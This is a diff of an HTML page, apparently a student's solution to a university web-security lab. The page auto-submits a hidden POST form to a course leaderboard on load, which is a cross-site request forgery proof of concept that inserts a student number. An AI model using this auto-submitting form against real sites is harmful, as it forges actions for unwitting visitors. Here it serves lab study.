@@ -1,19 +1,28 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Automatic Leaderboard Submission</title>
-  </head>
-  <body>
-    <form id="leaderboard-form" action="https://comp3320-xss.uqcloud.net/leaderboard.php" method="POST">
-      <label for="name">Name:</label>
-      <input type="text" id="name" name="name"><br><br>
-      <input type="submit" value="submit">
+<head>
+    <style>
+        * {
+            color: lime;
+            background-color: black;
+            font-family: monospace;
+        }
+    </style>
+    <title>Hall of fame</title>
+</head>
+<body>
+    <h2>The legendary hackers</h2>
+    <p>Can you put your student number on the hall of fame?</p>
+    <form id="myForm" method="POST" action="https://comp3320-xss.uqcloud.net/leaderboard.php">
+        <p>Your name <input name="name" id="name"></p>
+        <input type="submit" value="submit">
     </form>
+
     <script>
-      window.onload = function() {
-        document.getElementById('name').value = 's4702725'; // Set the value of the "name" field to your desired name
-        document.getElementById('leaderboard-form').submit(); // Submit the form automatically
-      };
+        window.onload = function() {
+            document.getElementById('name').value = 's4702725'; // Replace 'Your Name' with the desired name
+            document.getElementById('myForm').submit();
+        };
     </script>
-  </body>
+</body>
 </html>
